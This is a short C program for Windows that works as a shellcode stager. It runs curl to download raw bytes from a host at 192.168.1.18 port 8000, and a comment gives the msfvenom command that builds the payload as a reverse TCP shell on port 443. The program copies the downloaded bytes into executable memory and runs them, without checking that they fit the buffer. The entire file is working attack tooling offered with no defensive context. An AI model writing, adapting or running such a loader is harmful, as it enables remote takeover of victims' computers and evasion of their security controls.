#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

int main() {
    FILE *fpipe;
    char *command = "curl http://192.168.1.18:8000/code.bin"; // msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 -f raw -o code.bin
    char c = 0;
    unsigned char code[460];
    int counter = 0;

    fpipe = _popen(command, "r");  // Use _popen instead of popen
    if (fpipe == NULL) {
        perror("_popen() failed.");
        exit(EXIT_FAILURE);
    }

    while (fread(&c, sizeof c, 1, fpipe)) {
        code[counter] = c;
        printf("%c", code[counter]);
        counter++;
    }

    _pclose(fpipe);  // Use _pclose instead of pclose

    void *exec = VirtualAlloc(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, code, sizeof code);
    ((void(*)())exec)();

    return 0;
}

